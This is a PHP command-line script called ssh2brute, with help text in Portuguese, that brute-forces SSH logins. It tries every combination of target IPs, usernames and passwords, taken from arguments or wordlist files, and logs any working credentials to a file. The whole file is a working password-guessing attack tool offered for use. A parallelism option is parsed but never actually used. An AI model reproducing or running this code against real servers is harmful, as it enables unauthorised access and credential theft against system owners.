#!/usr/bin/php -q
<?php
    function _help($n=0, $e=''){
	echo "ssh2brute [opcoes]\n";
	echo "\n";
	echo "Opcoes:\n";
	echo "-d	ip do alvo (ip ou ip:porta)\n";
	echo "-D	arquivo lista de ips alvo\n";
	echo "\n";
	echo "-u	nome de usuario\n";
	echo "-U	arquivo lista com nomes de usuarios\n";
	echo "\n";
	echo "-p	senha\n";
	echo "-P	arquivo lista de senhas\n";
	echo "\n";
	if($e!='') echo "Erro: ",$e,"\n";
	switch($n){
	    case 1: echo 'Informe o alvo'; break;
	    case 2: echo 'Informe o usuario'; break;
	    case 3: echo 'Informe a senha'; break;
	}
	echo "\n";
	exit($n);
    }
    function _ssh2test($ip, $port, $user, $pass){
	$connection = @ssh2_connect($ip, $port);
	if(!$connection) return 1;
	if (@ssh2_auth_password($connection, $user, $pass)) return 0;
	return 2;
    }

    // listas
    $target = array();
    $user = array();
    $pass = array();
    
    // parametros
    $quiet = false;	// modo quieto
    $paral = 1;		// numero de tarefas simultaneas
    $outfile = '';	// arquivo com sucessos

    $prog = $argv[0];
    foreach($argv as $k=>$arg){
	$next = isset($argv[$k+1]) ? trim($argv[$k+1]) : '';
	switch($arg){
	    case '-q': $quiet = true; break;
	    case '-f': $paral = (int)$next; if(!$paral) $paral = 1; break;
	    case '-o': $outfile = $next; break;

	    case '-u': $user[] = $next; break;
	    case '-U':
		if(is_file($next)){
		    $a = file($next);
		    foreach($a as $line){
			$line = trim($line);
			if($line!='') $user[] = $line;
		    }
		}
		break;

	    case '-d': $target[] = $next; break;
	    case '-D':
		if(is_file($next)){
		    $a = file($next);
		    foreach($a as $line){
			$line = trim($line);
			if($line!='') $target[] = $line;
		    }
		}
		break;

	    case '-p': $pass[] = $next; break;
	    case '-P':
		if(is_file($next)){
		    $a = file($next);
		    foreach($a as $line){
			$line = trim($line);
			if($line!='') $pass[] = $line;
		    }
		}
		break;
	}
    }
    if(!count($target)) _help(1);    
    if(!count($user)) _help(2);
    if(!count($pass)) _help(3);

    // preparar lista de alvos para incluir porta
    foreach($target as $k=>$tg){
	$ip = $tg;
	$port = 0;
	$p = strpos($tg, ':');
	if($p!==false){
	    $a = explode(':', $tg);
	    list($ip, $port) = explode(':', $tg);
	    $port = (int)$port;
	}
	if(!$port) $port = 22;
	$target[$k] = array($ip,$port);
    }

    // contar combinacoes para dividir no paralelismo
    $perproc = 0;
    if($paral > 1){
	if(!$quiet) echo "ssh2brute> count ";
	$co = 0;
	foreach($target as $a) foreach($user as $b) foreach($pass as $c) $co++;
	if(!$quiet) echo $co," tests\n";
	if(!$co){
	    if(!$quiet) echo "ssh2brute> no tests to do\n";
	    exit(10);
	}
	$perproc = $co / $paral;
	if($perproc < 1) $paral = 0; else
	if(!$quiet) echo "ssh2brute> paralels: ",$paral," with ",$perproc," tests\n";
    }

    foreach($target as $k=>$tg){
	if(!$quiet) echo "ssh2brute> ",$tg[0],':',$tg[1],"\n";
	foreach($user as $u){
	    if(!$quiet) echo "         > user ",$u,"\n";
	    foreach($pass as $p){
		if(!$quiet) echo "          > pass ",$p,"\n";
		if(_ssh2test($tg[0], $tg[1], $u, $p)) continue;

		// FOUND!
		if(!$quiet)
		    echo "ssh2brute> sucess: ",$tg[0],":",$tg[1]," -> ",$u," password ",$p,"\n";
		//-
		if($outfile!='')
		    file_put_contents($outfile, $tg[0].':'.$tg[1].' | '.$u.' '.$p."\n", FILE_APPEND);
		//-
	    }
	}
    }


?>
